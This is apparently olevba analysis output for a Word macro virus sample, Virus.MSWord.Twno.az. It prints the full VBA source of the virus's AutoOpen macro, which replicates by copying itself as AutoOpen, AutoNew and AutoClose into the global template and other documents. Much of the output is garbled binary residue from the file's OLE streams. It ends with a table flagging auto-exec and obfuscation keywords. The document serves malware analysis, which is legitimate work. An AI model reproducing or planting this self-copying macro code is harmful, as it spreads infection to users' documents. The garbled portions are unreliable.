olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.az-5fd7290ffaaac13b8767702503122544f68f12e6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.az-5fd7290ffaaac13b8767702503122544f68f12e6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.az-5fd7290ffaaac13b8767702503122544f68f12e6 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim nm__()
Public Sub MAIN()
ReDim nm__(4)
Dim test
Dim con
Dim i
Dim ans$
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
WordBasic.DisableInput 1
If WordBasic.Day(WordBasic.Now()) = 32 Then
try:
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo try
test = -1
con = 1
i = 0

        While test = -1

            ans$ = WordBasic.[InputBox$]("ÎĘĚâ:" + Chr(13) + _
"Çë°Ń" + Chr(-24144) + "ÖĄÂé,ÖĄÂé,żŞĂĹ°É!" + Chr(-24143) + "Őâľä»°ŇëłÉÓ˘Óď!", "Í¬ĽĂŇ»şĹşę˛ˇ¶ľ")
            If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "panacea" Then
            GoTo exit_
            End If
            If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = "Sesame, sesame, open the door!" Then
            WordBasic.MsgBox "·ÇłŁŐýČ·ŁˇÄăÍŃĎŐÁËŁˇ", "Í¬ĽĂŇ»şĹşę˛ˇ¶ľ"
            GoTo exit_
            Else
            WordBasic.CenterPara
            WordBasic.FormatFont Points:=16, Bold:=1, Underline:=1
            WordBasic.Insert "WRONG! "
            GoTo try
            End If

        Wend
            End If

nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
        Next kk
        
End If

file$ = WordBasic.[FileName$]()
filem$ = file$ + ":AutoOpen"
If t <> 1 Then
    WordBasic.MacroCopy filem$, "AutoOpen"
    WordBasic.MacroCopy filem$, "AutoNew"
    WordBasic.MacroCopy filem$, "AutoClose"
End If

nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
    For kkk = 1 To nor1
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
        tt = 1
        End If
        Next kkk
        
End If

If tt <> 1 Then
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "AutoOpen", filem$
End If

    

exit_:
End Sub

-------------------------------------------------------------------------------
VBA MACRO DocumentSummaryInformation 
in file: Virus.MSWord.Twno.az-5fd7290ffaaac13b8767702503122544f68f12e6 - OLE stream: '\x05DocumentSummaryInformation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attribuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu             >  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ          þÿÿÿÿÿÿÿÿt BBs  0000ÏàB 00ÏB0Ï00AtiueV_ae="hsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trb   >ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ      þÿÿÿÿ B 00ÏB0Ï00Aie_e"sutAie_e"0ÐB 0 B0rtBm icn
r  ÿÿÿÿÿÿÿÿÿÿ   ÿÿ  0BÏ0i_"uAee0B0BrB c
 ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAttribute VB_Name = "ThisDocument"
Attribute VB_BBNm  TiDcmn"
trbt BBs  0000ÏàB 00ÏB0Ï00AtiueV_ae="hsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trbt BBs  0000ÏàB 00ÏB0Ï00AtiueV_ae="hsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trb      >ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ      þÿÿÿÿ B 00ÏB0Ï00Aie_e"sutAie_e"0ÐB 0 B0rtBm icn
r  ÿÿÿÿÿÿÿÿÿÿ   ÿÿ  0BÏ0i_"uAee0B0BrB c
 ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAtiueV_ae="hsouet
AtiueV_Bm icn
rtBs 00à 0BÏ0tuVa=hoe
tuVa={2s0à0Ïtb N TDm"tb B 00ÏB0Ï00Aie_e"sutAie_e"0ÐB 0 B0rtBm icn
r   ÿÿÿÿÿÿÿÿÿÿ   ÿÿ  0BÏ0i_"uAee0B0BrB c
 ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAie_e"sutAie_minrB 0 B0uahetV=2sàÏbNTmt  0BÏ0i_"uAee0B0BrB c
  ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAeesti_ir  0aeV2àbTt B0_ue00r 
 ÿÿÿ  0u0r
ÿÿ urÿuÿAet_r aVàT 0u0r
ÿÿ urÿuÿAtraà urÿuÿAràuÿAàAAAAttribute VBsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trbt BBs  0000ÏàB 00ÏB0Ï00AtiueV_ae="hsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trbt BBs  0000ÏàB 00ÏB0Ï00AtiueV_ae="hsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trb      >ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ      þÿÿÿÿ B 00ÏB0Ï00Aie_e"sutAie_e"0ÐB 0 B0rtBm icn
r  ÿÿÿÿÿÿÿÿÿÿ   ÿÿ  0BÏ0i_"uAee0B0BrB c
 ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAtiueV_ae="hsouet
AtiueV_Bm icn
rtBs 00à 0BÏ0tuVa=hoe
tuVa={2s0à0Ïtb N TDm"tb B 00ÏB0Ï00Aie_e"sutAie_e"0ÐB 0 B0rtBm icn
r   ÿÿÿÿÿÿÿÿÿÿ   ÿÿ  0BÏ0i_"uAee0B0BrB c
 ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAie_e"sutAie_minrB 0 B0uahetV=2sàÏbNTmt  0BÏ0i_"uAee0B0BrB c
  ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAeesti_ir  0aeV2àbTt B0_ue00r 
 ÿÿÿ  0u0r
ÿÿ urÿuÿAet_r aVàT 0u0r
ÿÿ urÿuÿAtraà urÿuÿAràuÿAàAAAAtiueVsutAie_e"0ÐB 0 B0rtBm icn
rtBs 00à 0BÏ0tuVa=hoe
tuVa={2s0à0Ïtb N TDm"tb B 00ÏB0Ï00Aie_e"sutAie_e"0ÐB 0 B0rtBm icn
r   ÿÿÿÿÿÿÿÿÿÿ   ÿÿ  0BÏ0i_"uAee0B0BrB c
 ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAie_e"sutAie_minrB 0 B0uahetV=2sàÏbNTmt  0BÏ0i_"uAee0B0BrB c
  ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAeesti_ir  0aeV2àbTt B0_ue00r 
 ÿÿÿ  0u0r
ÿÿ urÿuÿAet_r aVàT 0u0r
ÿÿ urÿuÿAtraà urÿuÿAràuÿAàAAAAiesti_"Ð  0tminrB 0 B0uahetV=2sàÏbNTmt  0BÏ0i_"uAee0B0BrB c
  ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAeesti_ir  0aeV2àbTt B0_ue00r 
 ÿÿÿ  0u0r
ÿÿ urÿuÿAet_r aVàT 0u0r
ÿÿ urÿuÿAtraà urÿuÿAràuÿAàAAAAet_Ð tir  0aeV2àbTt B0_ue00r 
 ÿÿÿ  0u0r
ÿÿ urÿuÿAet_r aVàT 0u0r
ÿÿ urÿuÿAtraà urÿuÿAràuÿAàAAAAtÐtr aVàT 0u0r
ÿÿ urÿuÿAtraà urÿuÿAràuÿAàAAAAÐraà urÿuÿAràuÿAàAAAAràuÿAàAAAAàAAAAAAAAAAAttribute VB_Namt
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trbt BBs  0000ÏàB 00ÏB0Ï00AtiueV_ae="hsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trbt BBs  0000ÏàB 00ÏB0Ï00AtiueV_ae="hsouet
AtiueV_ae="{02ÐBs 00à 0BÏ0trbt BNm  TiDcmn"
trb      >ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ      þÿÿÿÿ B 00ÏB0Ï00Aie_e"sutAie_e"0ÐB 0 B0rtBm icn
r  ÿÿÿÿÿÿÿÿÿÿ   ÿÿ  0BÏ0i_"uAee0B0BrB c
 ÿÿÿÿÿ  ÿ B0_ue00r 
ÿÿÿ  0u0r
ÿÿ urÿuÿAtiueV_ae="hsouet
AtiueV_Bm icn
rtBs 00à 0BÏ0tuVa=hoe
tuVa={2s0
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

